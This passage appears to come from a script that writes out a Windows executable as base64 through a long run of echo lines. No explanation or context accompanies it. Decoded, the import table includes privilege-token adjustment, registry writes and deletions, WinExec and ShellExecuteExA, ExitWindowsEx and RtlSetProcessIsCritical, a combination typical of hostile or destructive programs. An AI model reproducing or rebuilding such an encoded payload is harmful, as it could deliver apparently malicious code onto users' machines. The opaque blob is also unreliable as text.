echo XsMBAHbDAQCSwwEAoMMBALDDAQC8wwEAysMBANjDAQDuwwEABsQBAB7EAQAuxAEA
echo RMQBAFrEAQBmxAEAcsQBAITEAQCWxAEAqMQBALrEAQDOxAEA5MQBAPbEAQAIxQEA
echo FsUBACjFAQA0xQEAQsUBAE7FAQBqxQEAdsUBAIjFAQAAAAAApMUBALbFAQDExQEA
echo 0sUBAAAAAADsxQEAAMYBABDGAQAAAAAALMYBADzGAQBSxgEAAAAAAHTGAQCCxgEA
echo kMYBAJ7GAQAAAAAAwMYBANLGAQDixgEA8MYBAALHAQAUxwEAIscBADbHAQBOxwEA
echo WMcBAHTHAQAAAAAAmscBAKbHAQCwxwEAxscBANbHAQDqxwEA/McBAAjIAQAYyAEA
echo JsgBADLIAQBAyAEAWMgBAHTIAQCEyAEAlsgBAKrIAQC6yAEAzMgBAODIAQD2yAEA
echo CMkBABjJAQAoyQEAPMkBAFDJAQBiyQEAeMkBAIzJAQCYyQEAoskBALTJAQDIyQEA
echo 4MkBAPjJAQAGygEAFsoBACjKAQAAAAAAQsoBAFLKAQBgygEAbsoBAILKAQCQygEA
echo oMoBAKzKAQAAAAAAyMoBAAAAAADcygEAAAAAAPzKAQASywEAKMsBAD7LAQBQywEA
echo ZMsBAHLLAQCCywEAAAAAAJ7LAQAAAAAAwMsBAAAAAABrZXJuZWwzMi5kbGwAAAAA
echo RGVsZXRlQ3JpdGljYWxTZWN0aW9uAAAATGVhdmVDcml0aWNhbFNlY3Rpb24AAAAA
echo RW50ZXJDcml0aWNhbFNlY3Rpb24AAAAASW5pdGlhbGl6ZUNyaXRpY2FsU2VjdGlv
echo bgAAAFZpcnR1YWxGcmVlAAAAVmlydHVhbEFsbG9jAAAAAExvY2FsRnJlZQAAAExv
echo Y2FsQWxsb2MAAAAAR2V0VmVyc2lvbgAAAABHZXRDdXJyZW50VGhyZWFkSWQAAAAA
echo SW50ZXJsb2NrZWREZWNyZW1lbnQAAAAASW50ZXJsb2NrZWRJbmNyZW1lbnQAAAAA
echo VmlydHVhbFF1ZXJ5AAAAAFdpZGVDaGFyVG9NdWx0aUJ5dGUAAABNdWx0aUJ5dGVU
echo b1dpZGVDaGFyAAAAbHN0cmxlbkEAAAAAbHN0cmNweW5BAAAATG9hZExpYnJhcnlF
echo eEEAAAAAR2V0VGhyZWFkTG9jYWxlAAAAR2V0U3RhcnR1cEluZm9BAAAAR2V0UHJv
echo Y0FkZHJlc3MAAAAAR2V0TW9kdWxlSGFuZGxlQQAAAABHZXRNb2R1bGVGaWxlTmFt
echo ZUEAAAAAR2V0TG9jYWxlSW5mb0EAAAAAR2V0Q29tbWFuZExpbmVBAAAARnJlZUxp
echo YnJhcnkAAABGaW5kRmlyc3RGaWxlQQAAAABGaW5kQ2xvc2UAAABFeGl0UHJvY2Vz
echo cwAAAFdyaXRlRmlsZQAAAFVuaGFuZGxlZEV4Y2VwdGlvbkZpbHRlcgAAAABSdGxV
echo bndpbmQAAABSYWlzZUV4Y2VwdGlvbgAAAABHZXRTdGRIYW5kbGUAAHVzZXIzMi5k
echo bGwAAAAAR2V0S2V5Ym9hcmRUeXBlAAAATG9hZFN0cmluZ0EAAABNZXNzYWdlQm94
echo QQAAAENoYXJOZXh0QQBhZHZhcGkzMi5kbGwAAAAAUmVnUXVlcnlWYWx1ZUV4QQAA
echo AABSZWdPcGVuS2V5RXhBAAAAUmVnQ2xvc2VLZXkAb2xlYXV0MzIuZGxsAAAAAFN5
echo c0ZyZWVTdHJpbmcAAABTeXNSZUFsbG9jU3RyaW5nTGVuAAAAU3lzQWxsb2NTdHJp
echo bmdMZW4Aa2VybmVsMzIuZGxsAAAAAFRsc1NldFZhbHVlAAAAVGxzR2V0VmFsdWUA
echo AABMb2NhbEFsbG9jAAAAAEdldE1vZHVsZUhhbmRsZUEAAGFkdmFwaTMyLmRsbAAA
echo AABSZWdTZXRWYWx1ZUV4QQAAAABSZWdPcGVuS2V5RXhBAAAAUmVnRmx1c2hLZXkA
echo AABSZWdEZWxldGVWYWx1ZUEAAABSZWdDcmVhdGVLZXlFeEEAAABSZWdDbG9zZUtl
echo eQAAAE9wZW5Qcm9jZXNzVG9rZW4AAAAATG9va3VwUHJpdmlsZWdlVmFsdWVBAAAA
echo RnJlZVNpZAAAAEFsbG9jYXRlQW5kSW5pdGlhbGl6ZVNpZAAAAABBZGp1c3RUb2tl
echo blByaXZpbGVnZXMAa2VybmVsMzIuZGxsAAAAAFdyaXRlRmlsZQAAAFdpbkV4ZWMA
echo AABXYWl0Rm9yU2luZ2xlT2JqZWN0AAAAVmlydHVhbFF1ZXJ5AAAAAFRlcm1pbmF0
echo ZVByb2Nlc3MAAAAAU2V0RmlsZVBvaW50ZXIAAAAAU2V0RXZlbnQAAAAAU2V0RW5k
echo T2ZGaWxlAAAAAFJlc2V0RXZlbnQAAAAAUmVhZEZpbGUAAAAAT3BlblByb2Nlc3MA
echo AABMZWF2ZUNyaXRpY2FsU2VjdGlvbgAAAABJbml0aWFsaXplQ3JpdGljYWxTZWN0
echo aW9uAAAAR2V0VmVyc2lvbkV4QQAAAEdldFRocmVhZExvY2FsZQAAAEdldFN0cmlu
echo Z1R5cGVFeEEAAAAAR2V0U3RkSGFuZGxlAAAAAEdldFByb2NBZGRyZXNzAAAAAEdl
echo dE1vZHVsZUhhbmRsZUEAAAAAR2V0TW9kdWxlRmlsZU5hbWVBAAAAAEdldExvY2Fs
echo ZUluZm9BAAAAAEdldExvY2FsVGltZQAAAABHZXRMYXN0RXJyb3IAAAAAR2V0RnVs
echo bFBhdGhOYW1lQQAAAABHZXREaXNrRnJlZVNwYWNlQQAAAEdldERhdGVGb3JtYXRB
echo AAAAAEdldEN1cnJlbnRUaHJlYWRJZAAAAABHZXRDdXJyZW50UHJvY2VzcwAAAEdl
echo dENQSW5mbwAAAEdldEFDUAAAAABGb3JtYXRNZXNzYWdlQQAAAABFbnVtQ2FsZW5k
echo YXJJbmZvQQAAAEVudGVyQ3JpdGljYWxTZWN0aW9uAAAAAERlbGV0ZUNyaXRpY2Fs
echo U2VjdGlvbgAAAENyZWF0ZUZpbGVBAAAAQ3JlYXRlRXZlbnRBAAAAAENvbXBhcmVT
echo dHJpbmdBAAAAAENsb3NlSGFuZGxlAHVzZXIzMi5kbGwAAAAAUG9zdE1lc3NhZ2VB
echo AAAAAE1lc3NhZ2VCb3hBAAAATG9hZFN0cmluZ0EAAABHZXRTeXN0ZW1NZXRyaWNz
echo AAAAAEZpbmRXaW5kb3dBAAAARXhpdFdpbmRvd3NFeAAAAENoYXJOZXh0QQAAAENo
echo YXJUb09lbUEAAGtlcm5lbDMyLmRsbAAAAABTbGVlcABzaGVsbDMyLmRsbAAAAFNo
echo ZWxsRXhlY3V0ZUV4QQBvbGVhdXQzMi5kbGwAAAAAU2FmZUFycmF5UHRyT2ZJbmRl
echo eAAAAFNhZmVBcnJheUdldFVCb3VuZAAAAABTYWZlQXJyYXlHZXRMQm91bmQAAAAA
echo U2FmZUFycmF5Q3JlYXRlAAAAVmFyaWFudENoYW5nZVR5cGUAAABWYXJpYW50Q29w
echo eQAAAFZhcmlhbnRDbGVhcgAAAABWYXJpYW50SW5pdABhZHZhcGkzMi5kbGwAAAAA
echo Q2hlY2tUb2tlbk1lbWJlcnNoaXAAAG50ZGxsLmRsbAAAAFJ0bFNldFByb2Nlc3NJ
echo c0NyaXRpY2FsAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
echo ANBBAAzQQQCYQEEAEOBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAAAUAEAAAAwDDAsMDgw
echo PDBAMEQwSDBMMFAwVDBgMG0wgDDRMNUw2TDxMAAxBDEgMSgxLDEwMTQxODE8MUAx
echo RDFIMWIxajFyMXoxgjGKMZIxmjGiMaoxsjG6McIxyjHSMdox4jHqMfIx+jECMgoy
echo EjIaMiIyKjIyMjoyQjJKMlIyWjJiMmoycjKeMqYyrjK2Mr4yxjLOMtYy3zIAMwgz
echo cDN3M780NjWFNcs13jVUNpg22TYNNxk3NDfHNxY5UjlvOXo5hTmNOZc5oTmrOcE5
echo xznVOeg58jn4OQY6DDoUOiY6MjpBOk06VTpgOmY6czp5OpM6mjqkOq46uDrEOs86
echo 4DrmOu46+DoPOxo7OztTO3I7ijuSO9I76Ds3PFc8dTyfPaw93z3lPf49Bz4QPhs+
echo JD4rPjo+QT5jPrw+xD5JP2c/bD9yP94/5D/0P/0/AAAAIAAAzAAAAEIwSzBhMIcw
echo kzCbMM4w+DASMTwxRTFVMV0xYzFsMXMxeDF+MZExmjG4Mb4xxjHwMfYxCDIgMiwy
echo NDJLMloyajKKMqIyxjLOMtQy2jIMMzAzTjNeM2QzbDPRM9wz5TPrM/szBDRVNFw0
echo bDR2NHw0hDSKNJA0lzShNEg1cTWPNZs1ozX9NQM2CzYvNk82dzaQNqk2ujbPNtw2
echo /DY+OUc5eDl/Oe05NztPO2A7fDuUO6U7sTv6PTk+ST5fPn0+kz6qPr8++T4AMAAA
echo oAAAAF0wuzDzMVIyZjJuMoQynDKqMt4y+jIGMxozJDM3M2czlDOdM88z2DMNNBQ0
echo NjSDNMc00zQbNkM2SjZiNoQ2uDbANss29zYMN1c3ajd+N7I3tje8N8A3xTfMN9I3
echo 2jflN0A4SDh0OH84nDimOMs41TjfOOc47Tj7OBY5Kzk1OTo5WTleOWM5hTmZOf45
echo BzotOjo6dTuRO+c+AEAAAEAAAAAJMmYzbzN2NH80Zjm5Ock5iTunO8U73zstPE88
echo 5z3xPfw9DD4TPmU+dj62Pr0+zz7tPvY+Aj8JPwBQAACcAgAAKzKuMtcyUjN7M6Iz
echo JDRtNI80mzSiNKw0tjTNNN406zTyNPY0/DQANQY1DTURNSs1NDU9NUk1UzV6NY81
echo oDWqNbI1ujXCNco18jUcNio2LzZINlg2aTZ6NoY2izaQNpc2njaoNr82yzbYNuo2
echo 9zYDNxA3IjcqNzI3OjdCN0o3UjdaN2I3ajdyN3o3gjeKN5I3mjeiN6o3sje6N8I3
echo yjfSN9o34jfqN/I3+jcCOAo4EjgaOCI4KjgyODo4QjhKOFI4WjhiOGo4cjh6OII4
echo ijiSOJo4ojiqOLI4ujjCOMo40jjaOOI46jjyOAc5EzkgOTI5ODlAOUg5UDlYOWA5
echo aDlwOXg5gDmIOZA5mDmgOag5sDm4OcA5yDnQOdg54DnoOfA5+DkAOgg6EDoYOiA6
echo KDowOjg6QDpIOlA6WDpgOmg6cDp4OoA6iDqQOpg6oDqoOrA6uDrAOsg60DrYOuA6
echo 6DrwOvg6ADsIOxA7GDsgOyg7MDs4O0A7SDtQO1g7YDtoO3A7eDuAO4g7kDuYO6A7
echo qDuwO7g7wDvIO9A72DvgO+g78Dv4OwA8DzwbPCg8OjxAPEw8YDxoPGw8cDx0PHg8
echo fDyAPIQ8iDyWPKg8yDzQPNQ82DzcPOA85DzoPOw88DwEPSQ9LD0wPTQ9OD08PUA9
echo RD1IPUw9YD2APYg9jD2QPZQ9mD2cPaA9pD2oPbg92D3gPeQ96D3sPfA99D34Pfw9
echo AD4QPjA+OD48PkA+RD5IPkw+UD5UPlg+cD6QPpg+nD6gPqQ+qD6sPrA+tD64Psg+
echo 6D7wPvQ++D78PgA/BD8IPww/ED8gP0A/SD9MP1A/VD9YP1w/YD9kP2g/eD+YP6A/
echo pD+oP6w/sD+0P7g/vD/AP9Q/9D/8PwAAAGAAAAQCAAAAMAQwCDAMMBAwFDAYMBww
echo LDBMMFQwWDBcMGAwZDBoMGwwcDB0MIQwpDCsMLAwtDC4MLwwwDDEMMgwzDDcMPww
echo BDEIMQwxEDEUMRgxHDEgMSQxNDFUMVwxYDFkMWgxbDFwMXQxeDF8MYwxrDG0Mbgx
echo vDHAMcQxyDHMMdAx1DHoMQgyEDIUMhgyHDIgMiQyKDIsMjAyRDJkMmwycDJ0Mngy
echo fDKAMoQyiDKMMqAywDLIMswy0DLUMtgy3DLgMuQy6DIAMyAzKDMsMzAzNDM4Mzwz
echo QDNEM0gzWDN4M4AzhDOIM4wzkDOUM5gznDOgM7Qz1DPcM+Az5DPoM+wz8DP0M/gz
echo /DMMNCw0NDQ4NDw0QDRENEg0TDRQNFQ0aDSINJA0lDSYNJw0oDSkNKg0rDSwNMg0
echo 6DTwNPQ0+DT8NAA1BDUINQw1EDUkNUQ1TDVQNVQ1WDVcNWA1ZDVoNWw1gDWgNag1
echo rDWwNbQ1uDW8NcA1xDXINdg1+DUANgQ2CDYMNhA2FDYYNhw2IDY4NkU2TTZcNmk2
echo cTaMNqw2tDa4Nrw2wDbENsg2zDbQNtQ2LDcwNzQ3ODc8N0A3RDdcN2g3bDeIN5A3
echo lDeYN5w3oDekN6g3rDewNwg4xTvVO+A77TvyO/w7DDwXPCQ8KTyyPMU80TzoPPQ8
echo Qz1UPWs9sT25Pe4+AHAAAGwAAABaMW8xejHpMu0y8TL1Mvky/TIBMwUzCTMNMxEz
echo FTMZMx0zITMlMykzLTP5MwA0wjRNNnk2gTaJNpE2mTb+Ni03SDdMN1A3VDdYN5U4
echo 0jnnOfI6gTuTOzs8fT2XPaE9Bz7jPgAAAIAAAJQAAACDMLcxnjLUMiUzUjO2MwA0
echo OzRKNLk0BzVVNcg1zzUMNhA2FDYYNhw2IDYkNig2LDYwNjQ2ODY8NkA2RDZINjE3
echo SzepN9A35Df4Nyk4aTh+OJM4dTmJOdU5EjpPOm86gDqYOss63zoSO0g7dzuLO5w7
echo rDvCO8477DtfPNQ85T04PvI+Nj87P4A/9j8AAACQAAC8AAAAFzAqMDIwcTB2MIQw
echo pzDWMIcxozHqMQAyDTISMiQybzKHMpkysTLdMi8zQTNYM2ozvjPrMxg0STRbNHI0
echo hDSeNdo28jb3NgM3JjdTN1g3cjeXN8k3AzgNODM4TzhuOIA4qji+OO84/jgYOSo5
echo ZTmFOa05FzpMOmU6cjqLOpo6szrOOgg72zsbPCA8KDxSPGM8bDwhPSs9dT2QPZk9
echo Lj5dPuw+Jj9sP4M/pT+zP7o/0j/ZP+w/AKAAACQBAAAEMCMwKzA5MHswmTDEMNMw
echo 5zA6MUEx4jEUMi4yPTL5MgszVTNnM3szxzPzMyg0NzRGNGI0kjSZNKM0qTSwNLo0
echo vzTFNMo00DTVNNs04jToNO008zT4NP40BTULNRY1HjUnNTM1OTVBNUo1VjVbNWQ1
echo bTV2NX81iDWwNbk1wjXINdk15DXpNSI2QjZsNoY2pDb8Nhs3bDegN+w3VDiROME4
echo 1Tj7OA85fDrDOu86HTtBO007ZjtwO3o7jDuhO6w7sTu2O8M72TvgO/I79zsHPBE8
echo RzxlPII8lDzgPPY8Hz0tPUg9UT1sPX89kj2bPbY9yT3SPfE9/z0ePjY+Pz5TPmE+
echo dT6TPrU+xD7SPvU+Fz8mPzY/Pj9TP1s/eD+FPwCwAAAAAgAARjBcMJQwmzCqMLEw
echo zzD6MBoxKjE1MTsxQzFIMRgzoDWkNag1rDWwNbQ1uDW8NcA1xDXINcw10DXUNdg1
echo 3DXgNeQ16DXsNfA19DX4Nfw1ADYENgg2DDYQNhQ2GDYcNiA2JDYoNiw2MDY0Njg2
echo PDZANkQ2SDZMNlA2VDZYNlw2YDZkNmg2bDZwNnQ2eDZ8NoA2hDaMNpA2mDacNqQ2
echo qDawNrQ2vDbANsg2zDbUNtg24DbkNuw28Db4Nvw2BDcINxA3FDccNyA3KDcsNzQ3
echo ODdAN0Q3TDdQN1g3XDdkN2g3cDd0N3w3gDeIN4w3lDeYN6A3pDesN7A3uDe8N8Q3
echo yDfQN9Q33DfgN+g37Df0N/g3ADgEOAw4EDgYOBw4JDgoODA4NDg8OEA4SDhMOFQ4
echo WDhgOGQ4czh/OIo4njipOLM4vjjIONM43TjnOO049zj9OAc5EjkcOSc5MTk8OUY5
echo UTlbOWY5cDl6OYQ5jjmYOaI5rDm2OcA5yjncOfM5/zkHOhE6HDokOik6TzpuOns6
echo hzqUOqY6szq/Osw63jrmOu469jr+OmI7mDulO847BDwRPDo8cDx9PKY83DzpPBI9
echo SD1VPYQ9uj3UPQk+Rz55Prc+6T4rP0o/Uj9aP2I/mT+nP6w/tz+9P8I/zT/TP9g/
echo 4z/pP+4/+T//PwAAAMAAACACAAAEMA8wFTAaMCUwKzAwMDswQTBGMFEwVzBcMGcw
echo bTByMH0wgzCIMJMwmTCeMKkwrzC0ML8wxTDKMNUw2zDgMOsw8TD2MAExBzEMMRcx
echo HTEiMS0xMzE4MUMxSTFOMVkxXzFkMW8xdTF6MYUxpzKzMsAy0jICMwYzCjMiMzAz
echo NDNQM1gzXDNgM2QzaDNsM3AzdDN4M3wzgDOEM4gzjDOQM5QzmDOcM6AzpDOoM6wz
echo sDO0M8wz5DPoM/wzHDQkNCg0LDQwNDQ0ODQ8NEA0RDRgNIA0iDSMNJA0lDSYNJw0
echo oDSkNKg0xDTkNOw08DT0NPg0/DQANQQ1CDUMNSg1SDVQNVQ1WDVcNWA1ZDVoNWw1
echo cDWMNaw1tDW4Nbw1wDXENcg1zDXQNdQ18DUQNhg2HDYgNiQ2KDYsNjA2NDY4NlQ2
echo dDZ8NoA2hDaINow2kDaUNpg2nDa8Ntw25DboNuw28Db0Nvg2/DYANwQ3JDdEN0w3
echo UDdUN1g3XDdgN2Q3aDdsN4g3qDewN7Q3uDe8N8A3xDfIN8w30DfwNxA4GDgcOCA4
echo JDgoOCw4MDg0ODg4VDh0OHw4gDiEOIg4jDiQOJQ4mDicOME4zzjeOPU4JzljOXI5
echo iTmxOb85zjnlORc6UzpiOnk6oTqvOr461ToCO4k7mDu5O8g73zvuOwU8FDwrPDo8
echo UTxgPHc8hjyaPKk8ujzsPPs8Ej2JPZc9pj29PQDQAADYAAAAGDAzM0Ez4DMYNEc0
echo YjR4NNg0EDUnNUA1iDWlNd019jUNNmA2kDbFNuE25TbpNu028Tb1Nvk2/TYBNwU3
echo CTcNNxE3FTcZNx03ITclNyk3LTcxNzU3RzdfN3U5eTl9OYE5hTmJOY05kTmVOZk5
echo nTmhOaU5qTmtObE5tTm5Ob05wTnFOck5nTsFPBw8NTxwPI08wTzaPPE8LD1XPZo9
echo tz3uPQo+Dj4SPhY+Gj4ePiI+Jj4qPi4+Mj42Pjo+Pj5CPkY+Sj5OPlI+Vj5aPl4+
echo cD6IPgDgAADUAQAAkTCVMJkwnTChMKUwqTCtMLEwtTC5ML0wwTDFMMkwzTDRMNUw
echo 2TDdMOEw5TC5MtQ08zQLNSM1kjWpNbw1zjVMNmE2djZ7Nog2qDbCNsc2mTf6Nwc4
echo IjgoODw4QTghOUY5UzleOX85lTmtObI50znfOes59Tn7OQU6EDoaOiQ6NjpLOlc6
echo XzppOm46czp4On06gzqIOo06kzqaOqA6pzqtOrQ6ujrBOsc6zjrgOvA6+DoAOwg7
echo EDsYOyA7KDswOzg7QDtIO1A7XztrO3g7ijvDO8871jvgO+s7/TsOPBs8Jzw0PEY8
echo TDxsPHQ8eDx8PIA8hDyIPIw8kDyUPKg8yDzQPNQ82DzcPOA85DzoPOw88DwIPSg9
echo MD00PTg9PD1APUQ9SD1MPVA9ZD2EPYw9kD2UPZg9nD2gPaQ9qD2sPbw93D3kPeg9
echo 7D3wPfQ9+D38PQA+BD4UPjQ+PD5APkQ+SD5MPlA+VD5YPlw+bD6MPpQ+mD6cPqA+
echo pD6oPqw+sD60PsQ+5D7sPvA+9D74Pvw+AD8EPwg/DD8cPzw/RD9IP0w/UD9UP1g/
echo XD9gP2Q/fD+cP6Q/qD+sP7A/tD+4P7w/wD/EP8g/zD/QP9Q/4D8AAADwAAAEAgAA
echo ADAIMAwwEDAUMBgwHDAgMCQwKDA4MEgwVDBYMGAwZDBoMGwwcDB0MHgwfDCAMIQw
echo iDCMMJYwmjCsML0wwTDUMOkwDDEYMRwxLDE0MTgxPDFAMUQxSDFMMVAxVDFYMVwx
echo YDFkMWgxbDFwMXQxeDF8MYAxhDGIMYwxkDGUMZgxnDGgMaQxqDGsMbAxtDG4Mbwx
echo wDHEMcgxzDHQMdQx4jH0MQIyBjIYMjEyPDJMMlwyZDJoMmwycDJ0MngyfDKAMoQy
echo iDKMMpAylDKYMpwyoDKkMqgyrDKwMrQyuDK8MsAyxDLIMswy0DLUMtgy3DLgMuQy
echo 6DLsMvAy9DL4MvwyADMEMwgzDDMQMxQzGDMcMywzPTNBM1QzdDN8M4AzhDOIM4wz
echo kDOUM5gznDOgM6QzqDOsM7AztDO4M8Qz5DPsM/Az9DP4M/wzADQENAg0DDQQNBQ0
echo GDQcNCA0JDQoNDw0XDRkNGg0bDRwNHQ0eDR8NIA0hDSINIw0kDSUNJg0nDSgNLA0
echo 0DTYNNw04DTkNOg07DTwNPQ0+DQINSg1MDU0NTg1PDVANUQ1SDVMNVA1hjWVNaQ1
echo /zYWNx03HzgsODk4SzhQOOI4WDl7OZU5pznROTE6bjrzOj07aTsUPEM8hzyOPKU8
echo 8TxFPWA9HD4yPoE+nj7LPuQ+Lz+HP9Y/3z/tPwAAAQCAAAAAPzCnMPQwGjFDMXwx
echo kjEJMiYyYDKMMsYy4TKhM+czOzR4NAU1oDWyNc81/jUUNls2eDatNsc2CzcoN5E3
echo rzfuNxM4OzhNOGo4kzjEOCc5Tjl9OZM58jkPOkQ6lTolO5I7DzxFPGQ8tDzMPKw9
echo 5T2QPqg+WT9xP7g/ABABALQAAADBMMExyDEZMiAydDLsMvMyRjNNM5k0/DQDNWE1
echo aDV/NQE2DTYcNnw2gTaoNrA2vzYENwk3KDc5N/U3/Dd1OAA5LzneOSA6QzoiO0M7
echo RztLO087UztXO1s7XztjO2c7aztvO3M7dzt7O387gzuHO4s7jzuTO5c7kjy4PNw8
echo Vz6APrE+uz7LPtE+5T7vPgM/Ej9CP0c/WT93P4M/ij+UP6w/xj/QP9o/5D/zP/0/
echo ACABAHABAAAPMCcwMzBAMEwwXzBrMHUwfDCGMI0wlzCkMNMw3zDmMPEwAzEWMRwx
echo PDFEMUgxTDFQMVQxWDFcMWAxZDF8MYgxnDGkMagxrDGwMbQxuDG8McAxxDHSMUQz
echo +jMkNOU07DQjNS81NjVBNVM1ZjVuNXw1kTWeNaM1sDW1NcI1xzXUNdk15jXrNfg1
echo /TUKNg82HDYhNi42MzZANkU2UjZXNmQ2aTZ2Nns2iDaNNpo2nzasNrc2+zcbODs4
echo TzhbOGg4ejiCOKI4zTg8OVo5xTnJOv86JjueO8I7FjxHPGY8jzykPK48uDwnPTo9
echo TD1QPVQ9WD1cPWA9ZD1oPWw9cD10PXg9fD2APYQ9iD2MPZA9lD2YPZw9oD2kPag9
echo rD2wPbQ9uD28PcA9xD3IPcw90D3UPdw99D0BPg4+KD40Pk0+fj6nPtw+9j4CPx4/
echo MD9QP1U/cD9+P4g/mT+eP6g/rT/BP8Y/3D/hP/M/AAAAQAEAyAAAADgwPDBAMCQx
echo LDEwMVQxWDF8MYAxhDGIMYwxkDGUMZgxnDGgMaQxqDGsMbAxtDG4MbwxwDHEMcgx
echo zDHQMdQx2DHcMeAx5DHoMewx8DH0Mfgx/DEAMgQyCDIMMhAyTDJUMlwyZDJsMnQy
echo fDKEMowylDKcMqQyrDK0MrwyxDLMMtQy3DLkMuwy9DIcMyAzJDMoMywzMDM0Mzgz
echo PDNAM0QzSDNMM1AzVDNYM1wzYDNkM2gzbDOEM4gzjDOUM5gznDOgMwBwAQAAAQAA
echo rDOwM7QzuDO8M8AzxDPIM8wz0DPUM9gz3DPgM+Qz6DPsM/Az9DP4M/wzADQENAg0
echo DDQQNBQ0GDQcNCA0JDQoNCw0MDQ0NDg0PDRANEQ0SDRMNFA0VDRYNFw0YDRkNGg0
echo bDRwNHQ0eDR8NIA0hDSINIw0kDSUNJg0nDSgNKQ0qDSsNLA0tDS4NLw0wDTENMg0
echo zDTQNNQ02DTcNOA05DToNOw08DT0NPg0/DQANQQ1CDUMNRA1FDUYNRw1IDUkNSg1
echo LDUwNTQ1ODU8NUA1RDVINUw1UDVUNVg1XDVgNWQ1aDVsNXA1dDV4NXw1gDWENYg1
echo jDWQNZQ1AAAA4AEAFAAAAAAwBDAIMAwwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAR9jTwAAAAAAAAEA
echo BgAAABgAAIAAAAAAAR9jTwAAAAAAAAcA+g8AAGAAAID7DwAAeAAAgPwPAACQAACA
echo /Q8AAKgAAID+DwAAwAAAgP8PAADYAACAABAAAPAAAIAAAAAAAR9jTwAAAAAAAAEA
echo AAAAAAgBAAAAAAAAAR9jTwAAAAAAAAEAAAAAABgBAAAAAAAAAR9jTwAAAAAAAAEA
echo AAAAACgBAAAAAAAAAR9jTwAAAAAAAAEAAAAAADgBAAAAAAAAAR9jTwAAAAAAAAEA
echo AAAAAEgBAAAAAAAAAR9jTwAAAAAAAAEAAAAAAFgBAAAAAAAAAR9jTwAAAAAAAAEA
echo AAAAAGgBAAB4EQIAlAEAAAAAAAAAAAAADBMCAAgCAAAAAAAAAAAAABQVAgDsAAAA
echo AAAAAAAAAAAAFgIAmAEAAAAAAAAAAAAAmBcCALQDAAAAAAAAAAAAAEwbAgB8AwAA
echo AAAAAAAAAADIHgIAoAIAAAAAAAAAAAAAHQBMAGkAcwB0ACAAYwBvAHUAbgB0ACAA
echo bwB1AHQAIABvAGYAIABiAG8AdQBuAGQAcwAgACgAJQBkACkAHQBMAGkAcwB0ACAA
echo aQBuAGQAZQB4ACAAbwB1AHQAIABvAGYAIABiAG8AdQBuAGQAcwAgACgAJQBkACkA
echo EQBTAHQAcgBlAGEAbQAgAHIAZQBhAGQAIABlAHIAcgBvAHIAGwBGAGEAaQBsAGUA
echo ZAAgAHQAbwAgAHMAZQB0ACAAZABhAHQAYQAgAGYAbwByACAAJwAlAHMAJwAXACUA
echo cwAuAFMAZQBlAGsAIABuAG8AdAAgAGkAbQBwAGwAZQBtAGUAbgB0AGUAZAAkAE8A
echo cABlAHIAYQB0AGkAbwBuACAAbgBvAHQAIABhAGwAbABvAHcAZQBkACAAbwBuACAA
echo cwBvAHIAdABlAGQAIABsAGkAcwB0ABIAUwB0AHIAZQBhAG0AIAB3AHIAaQB0AGUA
echo IABlAHIAcgBvAHIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADAFQA
echo aAB1AAMARgByAGkAAwBTAGEAdAAGAFMAdQBuAGQAYQB5AAYATQBvAG4AZABhAHkA
echo BwBUAHUAZQBzAGQAYQB5AAkAVwBlAGQAbgBlAHMAZABhAHkACABUAGgAdQByAHMA
echo ZABhAHkABgBGAHIAaQBkAGEAeQAIAFMAYQB0AHUAcgBkAGEAeQAaAEMAYQBuAG4A
echo bwB0ACAAYQBzAHMAaQBnAG4AIABhACAAJQBzACAAdABvACAAYQAgACUAcwAlAFMA
echo dAByAGkAbgBnACAAbABpAHMAdAAgAGQAbwBlAHMAIABuAG8AdAAgAGEAbABsAG8A
echo dwAgAGQAdQBwAGwAaQBjAGEAdABlAHMAGwBDAGEAbgBuAG8AdAAgAGMAcgBlAGEA
echo dABlACAAZgBpAGwAZQAgACIAJQBzACIALgAgACUAcwAZAEMAYQBuAG4AbwB0ACAA
echo bwBwAGUAbgAgAGYAaQBsAGUAIAAiACUAcwAiAC4AIAAlAHMAFgBJAG4AdgBhAGwA
echo aQBkACAAcAByAG8AcABlAHIAdAB5ACAAdgBhAGwAdQBlACAATABpAHMAdAAgAGMA
echo YQBwAGEAYwBpAHQAeQAgAG8AdQB0ACAAbwBmACAAYgBvAHUAbgBkAHMAIAAoACUA
echo ZAApAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABwBKAGEAbgB1AGEA
echo cgB5AAgARgBlAGIAcgB1AGEAcgB5AAUATQBhAHIAYwBoAAUAQQBwAHIAaQBsAAMA
echo TQBhAHkABABKAHUAbgBlAAQASgB1AGwAeQAGAEEAdQBnAHUAcwB0AAkAUwBlAHAA
echo dABlAG0AYgBlAHIABwBPAGMAdABvAGIAZQByAAgATgBvAHYAZQBtAGIAZQByAAgA
echo RABlAGMAZQBtAGIAZQByAAMAUwB1AG4AAwBNAG8AbgADAFQAdQBlAAMAVwBlAGQA
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAOAEEAYgBzAHQAcgBhAGMA
